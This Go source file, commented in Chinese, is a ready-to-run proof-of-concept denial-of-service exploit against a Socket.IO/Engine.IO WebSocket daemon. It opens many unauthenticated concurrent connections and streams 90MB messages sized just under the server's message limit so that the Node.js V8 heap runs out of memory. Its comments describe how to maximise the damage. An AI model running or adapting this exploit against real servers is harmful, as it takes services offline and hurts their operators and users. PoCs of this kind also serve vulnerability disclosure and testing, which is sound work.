package main

import (
	"context"
	"flag"
	"log"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
)

var (
	// 目标 WebSocket 地址 (EIO=4 为 Engine.IO v4 协议)
	targetURL = flag.String("url", "ws://127.0.0.1:24444/socket.io/?EIO=4&transport=websocket", "Target WebSocket URL")
	// 并发连接数 (15个连接 * 90MB = ~1.35GB 内存占用，足以让默认配置的 V8 OOM)
	concurrency = flag.Int("c", 15, "Number of concurrent connections")
	// 每次发送的单条消息体积：默认 90MB (刚好卡在 Daemon 的 1e8 字节以内，防止触发上限断开，强制其驻留内存)
	payloadSize = flag.Int("s", 90*1024*1024, "Total size of each message to send in bytes (default 90MB)")
	// 每次写入本地 Socket 缓冲区的 Chunk 大小：1MB (保护本地内存)
	chunkSize = flag.Int("chunk", 1024*1024, "Size of each chunk written to the connection (default 1MB)")
)

func main() {
	flag.Parse()

	log.Printf("Starting Socket.IO OOM PoC targeting %s", *targetURL)
	log.Printf("Concurrency: %d, Message Size: %d bytes, Chunk Size: %d bytes", *concurrency, *payloadSize, *chunkSize)

	// 创建可被优雅取消的 Context
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// 捕获 Ctrl+C (SIGINT/SIGTERM) 用于优雅退出
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		log.Println("\n[!] Received interrupt signal, initiating graceful shutdown...")
		cancel()
	}()

	var wg sync.WaitGroup

	// 启动并发攻击协程
	for i := 0; i < *concurrency; i++ {
		wg.Add(1)
		go exploitConnection(ctx, &wg, i)
	}

	wg.Wait()
	log.Println("[*] All connections closed. PoC terminated.")
}

func exploitConnection(ctx context.Context, wg *sync.WaitGroup, id int) {
	defer wg.Done()

	dialer := websocket.DefaultDialer
	// 握手并建立未授权的 WebSocket 连接
	conn, _, err := dialer.DialContext(ctx, *targetURL, nil)
	if err != nil {
		log.Printf("[Worker %d] Failed to connect: %v", id, err)
		return
	}
	defer conn.Close()

	log.Printf("[Worker %d] Connected successfully", id)

	// 预分配复用的 1MB 内存块
	chunk := make([]byte, *chunkSize)
	// 填充随机干扰数据，防止网络层的零页压缩(Zero-Page Compression)优化导致内存占用不达标
	for i := range chunk {
		chunk[i] = byte('A' + (i % 26))
	}

	for {
		select {
		case <-ctx.Done():
			log.Printf("[Worker %d] Shutting down", id)
			// 发送标准的 WebSocket Close 帧，优雅断开，帮助目标服务器立刻触发 GC
			conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, "PoC Terminated"))
			return
		default:
			// 获取底层流式写入器 (BinaryMessage)，这将触发 WebSocket 分片传输
			writer, err := conn.NextWriter(websocket.BinaryMessage)
			if err != nil {
				log.Printf("[Worker %d] Error getting writer: %v", id, err)
				return
			}

			sent := 0
			// 循环将 Payload 写入，直至达到预设的巨大体积 (90MB)
			for sent < *payloadSize {
				select {
				case <-ctx.Done():
					writer.Close()
					return
				default:
				}

				writeLen := *chunkSize
				if *payloadSize-sent < writeLen {
					writeLen = *payloadSize - sent
				}

				n, err := writer.Write(chunk[:writeLen])
				if err != nil {
					log.Printf("[Worker %d] Write error (Target might be dead): %v", id, err)
					writer.Close()
					return
				}
				sent += n
			}
			
			// 只有 Close 被调用时，整个巨型 WebSocket 帧才算结束。
			// 此时服务端的 Node.js 将在内存中完整组装出这 90MB 的数据。
			writer.Close()

			log.Printf("[Worker %d] Successfully blasted %d bytes to V8 heap", id, sent)
			
			// 轻微的节流，让 Node.js 的 V8 引擎有机会尝试做无用的 GC，使得 CPU 和内存表现更具灾难性
			time.Sleep(200 * time.Millisecond)
		}
	}
}